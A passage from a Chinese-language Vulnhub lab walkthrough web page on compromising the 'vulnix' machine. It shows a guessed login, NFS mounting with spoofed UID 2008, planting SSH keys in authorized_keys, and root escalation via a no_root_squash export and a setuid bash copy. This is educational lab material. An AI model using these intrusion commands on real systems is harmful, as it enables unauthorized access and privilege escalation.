+</span></span></code></pre></td></tr></table></div></div><p><img src=https://www.vulnhub.cn/walkthrough/48/2.webp alt></p><p>login: <code>user</code></p><p>password: <code>letmein</code></p><p><img src=https://www.vulnhub.cn/walkthrough/48/3.webp alt></p><h3 id=authorized_keys>authorized_keys</h3><p><img src=https://www.vulnhub.cn/walkthrough/48/4.webp alt></p><p>查看靶机vulnix用户UID/GID为2008</p><p>本地新建vulnix用户，编写UID/GID为2008</p><p><img src=https://www.vulnhub.cn/walkthrough/48/5.webp alt></p><pre tabindex=0><code>$ sudo mount -t nfs 192.168.88.146:/home/vulnix /tmp/vulnix
+$ cp .ssh/id_rsa.pub /tmp 
+</code></pre><p>kali切换vulnix用户</p><p><img src=https://www.vulnhub.cn/walkthrough/48/6.webp alt></p><pre tabindex=0><code>$ su vulnix
+$ cd /tmp/vulnix
+$ mkdir .ssh
+$ cat  /tmp/id_rsa.pub &gt;/tmp/vulnix/.ssh/authorized_keys
+</code></pre><p><img src=https://www.vulnhub.cn/walkthrough/48/7.webp alt></p><p>使用密钥登录vulnix用户，登录成功</p><h2 id=提权>提权</h2><p><img src=https://www.vulnhub.cn/walkthrough/48/8.webp alt></p><p>添加</p><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/               *(rw,no_root_squash)
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://www.vulnhub.cn/walkthrough/48/9.webp alt></p><p>重启靶机生效</p><p><img src=https://www.vulnhub.cn/walkthrough/48/10.webp alt></p><pre tabindex=0><code>$ sudo mount -t nfs 192.168.88.146://tmp/t
+</code></pre><p>挂载靶机根目录</p><p><img src=https://www.vulnhub.cn/walkthrough/48/11.webp alt></p><h3 id=思路一>思路一</h3><p><strong>authorized_keys</strong></p><p>kali切换root用户</p><pre tabindex=0><code>$ cd /tmp/v/root
+$ mkdir .ssh 
+$ cat  /tmp/id_rsa.pub &gt;/tmp/v/root/.ssh/authorized_keys
+</code></pre><p>使用密钥登录root用户，登录成功</p><p><img src=https://www.vulnhub.cn/walkthrough/48/12.webp alt></p><h3 id=思路二>思路二</h3><p><strong>bash</strong></p><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ cp /tmp/v/bin/bash /tmp/v/home/vulnix 
+</span></span><span style=display:flex><span>$ chmod <span style=color:#b452cd>4755</span> /tmp/v/home/vulnix/bash 
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://www.vulnhub.cn/walkthrough/48/13.webp alt></p><p><img src=https://www.vulnhub.cn/walkthrough/48/14.webp alt></p><hr width=100% id=EOF><p style=color:#777>最后修改于 2012-09-10</p></div></div><nav class=post-pagination><a class=newer-posts href=/walkthrough/47/>下回<br>Vulnhub 47 /DEV/RANDOM-SCREAM</a>
+<a class=older-posts href=/walkthrough/25/>上回<br>Vulnhub 25 KIOPTRIX-LEVEL 1.3</a></nav><div class=post-comment-wrapper></div></div></div></div></div><div id=sideContainer class=side-container><a class="a-block nav-head false" href=https://www.vulnhub.cn><div class=nav-title>Vulnhub靶机教程</div><div class=nav-subtitle>Themed by Diary.</div></a><div class=nav-link-list><a class="a-block nav-link-item active" href=/walkthrough>Walkthroughs</a>
+<a class="a-block nav-link-item false" href=/posts>Archive</a>
+<a class="a-block nav-link-item false" href=/categories>Categories</a>
+<a class="a-block nav-link-item false" href=/tags>Tags</a>
+<a class="a-block nav-link-item false" href=/index.xml>RSS Feed</a></div><div class=nav-footer>Hugo Theme <a href=https://github.com/amazingrise/hugo-theme-diary>Diary</a> by <a href=https://risehere.net/>Rise</a><br>移植自 <a href=https://mak1t0.cc/ target=_blank rel="noreferrer noopener">Makito</a>'s <a href=https://github.com/SumiMakito/hexo-theme-journal/ target=_blank rel="noreferrer noopener">Journal.</a><br><br>&copy;
+This is a customized copyright.</div></div><div id=extraContainer class=extra-container><div class=toc-wrapper><div class=toc><div class=toc-content><center>- 目录 -</center><ul><ul><li><a href=#%e7%8e%af%e5%a2%83%e9%85%8d%e7%bd%ae class=nav-环境配置>环境配置</a></li><li><a href=#%e5%88%9d%e6%ad%a5%e6%89%93%e7%82%b9 class=nav-初步打点>初步打点</a></li><ul><li><a href=#%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f class=nav-端口扫描>端口扫描</a></li><ul><li><a href=#79 class=nav-79>79</a></li><li><a href=#2049 class=nav-2049>2049</a></li></ul></ul><li><a href=#%e8%8e%b7%e5%be%97%e6%9d%83%e9%99%90 class=nav-获得权限>获得权限</a></li><ul><li><a href=#hydra class=nav-hydra>hydra</a></li><li><a href=#authorized_keys class=nav-authorized_keys>authorized_keys</a></li></ul><li><a href=#%e6%8f%90%e6%9d%83 class=nav-提权>提权</a></li><ul><li><a href=#%e6%80%9d%e8%b7%af%e4%b8%80 class=nav-思路一>思路一</a></li><li><a href=#%e6%80%9d%e8%b7%af%e4%ba%8c class=nav-思路二>思路二</a></li></ul></div></div></div><div class=pagination><a id=globalBackToTop class="pagination-action animated-visibility" href=#top :class="{ invisible: scrollY == 0 }"><i class="material-icons pagination-action-icon">keyboard_arrow_up</i></a>
+<a type=button class=pagination-action id=darkModeToggleButton><span class="material-icons pagination-action-icon" id=darkModeToggleIcon>dark_mode</span></a></div></div><div id=single-column-footer>Hugo Theme <a href=https://github.com/amazingrise/hugo-theme-diary>Diary</a> by <a href=https://risehere.net/>Rise</a><br>移植自 <a href=https://mak1t0.cc/ target=_blank rel="noreferrer noopener">Makito</a>'s <a href=https://github.com/SumiMakito/hexo-theme-journal/ target=_blank rel="noreferrer noopener">Journal.</a><br><br>&copy;
+This is a customized copyright.</div></div><script src=/js/journal.js></script></body></html>
